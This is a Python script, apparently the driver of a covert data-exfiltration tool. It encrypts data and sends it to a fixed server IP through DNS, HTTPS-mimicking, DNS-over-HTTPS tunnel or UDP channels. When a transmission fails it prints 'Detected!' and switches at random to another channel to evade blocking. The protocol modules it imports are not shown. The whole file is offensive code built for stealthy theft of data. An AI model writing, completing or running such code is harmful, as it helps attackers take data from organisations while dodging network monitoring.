from encryption import SecureEncryption
from protocols.dns_traffic_simulation import DNSProtocol
from protocols.https_mimic import HTTPSProtocol
from protocols.doh_tunnel import DoHProtocol
from protocols.udp import UDPProtocol
import random

COMMAND = "exfiltrate data"
SERVER_IP = "192.168.1.100"
encryption = SecureEncryption()

# Define available exfiltration protocols
protocols = {
    "DNS": DNSProtocol(COMMAND, SERVER_IP),
    "HTTPS": HTTPSProtocol(COMMAND, SERVER_IP),
    "DOH": DoHProtocol(COMMAND),
    "UDP": UDPProtocol(COMMAND, SERVER_IP)
}

def exfiltrate_data(data, selected_protocol):
    """
    Encrypts data and transmits it using the selected protocol.
    If the protocol is blocked, the system switches to another protocol dynamically.
    """
    encrypted_data = encryption.encrypt(data, use_chacha=(selected_protocol == "UDP"))

    while True:
        protocol = protocols[selected_protocol]
        print(f"📡 Using protocol: {selected_protocol}")

        success = protocol.transmit(encrypted_data)

        if not success:
            new_protocol = random.choice([p for p in protocols if p != selected_protocol])
            print(f"⚠️ Detected! Switching to {new_protocol}")
            selected_protocol = new_protocol  # Update protocol
        else:
            break

if __name__ == "__main__":
    selected_protocol = random.choice(list(protocols.keys()))  # Randomly select a protocol
    exfiltrate_data("Top Secret Data", selected_protocol)
